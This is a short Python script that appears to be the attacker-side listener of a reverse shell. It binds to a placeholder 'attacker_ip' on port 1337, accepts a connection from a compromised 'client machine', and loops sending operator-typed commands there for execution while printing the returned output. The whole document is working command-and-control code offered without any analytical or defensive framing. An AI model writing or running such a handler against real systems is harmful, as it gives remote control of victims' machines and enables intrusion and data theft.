import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

connection, address = listener.accept()
print(f"Connected to {address}")

while True:
	## continuously send commands to be executed in client machine
	cmd = input("enter a command: ") # string input	
	connection.send(bytes(cmd, "utf-8")) # typecasted and converted into bytes
	
	output = connection.recv(2048) # receive the output from client machine
	print(output.decode("utf-8")) # display decoded bytes into string
